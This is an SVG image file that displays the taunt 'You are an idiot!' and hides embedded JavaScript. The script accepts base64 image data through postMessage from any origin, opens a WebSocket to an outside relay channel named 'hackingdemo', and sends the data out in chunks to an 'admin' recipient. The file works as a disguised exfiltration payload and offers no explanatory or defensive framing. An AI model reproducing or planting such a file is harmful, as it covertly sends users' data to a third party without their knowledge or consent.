<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="100%" height="100">
  <text x="50%" y="50%">You are an idiot!</text>
  <script type="application/ecmascript">
    <![CDATA[
      function handleImageData(base64Image) {
        const socket = new WebSocket('wss://cloud.achex.ca/hackingdemo');
        socket.addEventListener('open', function (event) {
          console.log('open', event);
          socket.send('{"auth":"sender", "password":"hoge"}');
          const split = 100;
          const length = Math.ceil(base64Image.length / split);
          for (let count = 0; count <= length; count++) {
            let str = base64Image.substr(count * split, split);
            socket.send('{"to":"admin", "msg":"' + str + '"}');
          }
          socket.send('{"to":"admin", "msg":"finish"}');
        });
      }

      function main() {
        // 外部スクリプトからデータを受け取る
        window.addEventListener('message', (event) => {
          if (event.data && event.data.base64Image) {
            handleImageData(event.data.base64Image);
          }
        }, false);
      }

      main();
    ]]>
  </script>
</svg>
